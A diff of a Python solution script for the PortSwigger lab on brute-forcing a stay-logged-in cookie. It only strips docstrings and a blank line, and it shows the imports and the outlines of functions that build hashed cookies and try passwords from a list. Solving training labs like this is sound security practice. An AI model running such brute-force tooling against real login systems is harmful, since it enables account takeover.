@@ -1,5 +1,4 @@
 ### Portswigger Lab: Brute-forcing a stay-logged-in cookie ###
-
 import requests
 import hashlib
 import base64
@@ -52,7 +51,6 @@ def generate_stay_logged_in_cookie(username, password):
 
 
 def load_password_list():
-    """Load passwords from a file."""
     try:
         with open("res/passwords.txt", "r") as file:
             return [line.strip() for line in file]
@@ -93,7 +91,6 @@ def test_cookie(settings, password):
 
 
 def brute_force_stay_logged_in_cookie(settings):
-    """Brute force the Stay-Logged-In cookie."""
     passwords = load_password_list()
     if not passwords:
         print("No passwords loaded.")
@@ -117,7 +114,6 @@ def brute_force_stay_logged_in_cookie(settings):
 
 
 def main():
-    """Main entry point for the script."""
     settings = initialize_settings()
     
     print("Retrieving session cookie...")
